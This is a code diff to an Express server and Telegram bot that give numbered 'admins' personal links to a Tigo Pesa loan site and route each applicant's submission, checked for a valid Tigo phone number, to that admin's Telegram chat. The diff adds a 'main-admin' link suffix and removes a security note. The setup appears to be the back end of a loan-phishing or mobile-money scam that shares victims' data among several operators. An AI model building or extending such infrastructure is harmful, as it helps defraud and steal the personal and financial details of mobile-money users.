@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - STRICT ISOLATED SUFFIX ROUTING SERVER**
+ * **MIXX BY YAS - MAIN ADMIN EXCLUSIVE IDENTIFIER SERVER**
  */
 
 const express = require('express');
@@ -23,11 +23,6 @@ const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
 let bot = null; 
 const sessions = new Map();
 
-/**
- * **STRICT ISOLATED CHAT ID RESOLUTION**
- * Maps explicit custom end number codes (e.g., ADMIN_01, ADMIN_02, ADMIN_03) 
- * ensuring requests remain entirely isolated to their specific unique target.
- */
 function resolveAdminChatId(adminKeyOrId) {
   if (!adminKeyOrId) return process.env.ADMIN_01 || null;
   const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
@@ -114,7 +109,7 @@ async function initBot() {
       const username = user.username ? `@${user.username}` : 'No username set';
       
       let assignedCode = '01';
-      for (let i = 1; i <= 20; i++) {
+      for (let i = 20; i >= 1; i--) {
         const codeStr = String(i).padStart(2, '0');
         if (process.env[`ADMIN_${codeStr}`] === chatId) {
           assignedCode = codeStr;
@@ -122,7 +117,9 @@ async function initBot() {
         }
       }
 
-      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
+      // Main Admin (ADMIN_01) gets a completely distinct and unique link suffix indicator
+      const linkParam = (assignedCode === '01') ? 'main-admin' : assignedCode;
+      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${linkParam}`;
 
       const userWelcomeInfo = 
         `🚨 **Unique Admin Link Registered Successfully!**\n\n` +
@@ -147,8 +144,7 @@ async function initBot() {
       const helpText =
         `🛠 **Isolated Admin Bot Guide**\n\n` +
         `/start - Register your chat ID and get your distinct custom-suffixed link.\n` +
-        `/help - View instruction menu.\n\n` +
-        `*Security Note:* Submissions and actions from clients through your unique link will exclusively target your chat.`;
+        `/help - View instruction menu.`;
 
       await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
     } catch (err) {}
@@ -226,6 +222,11 @@ app.post('/api/submit-application', (req, res) => {
 
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
+    }
+
+    // Map special main-admin string back to ADMIN_01 chat target
+    if (adminChatId === 'main-admin') {
+      adminChatId = '01';
     }
 
     if (!isValidTigoNumber(phone)) {
@@ -360,4 +361,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-  
+    
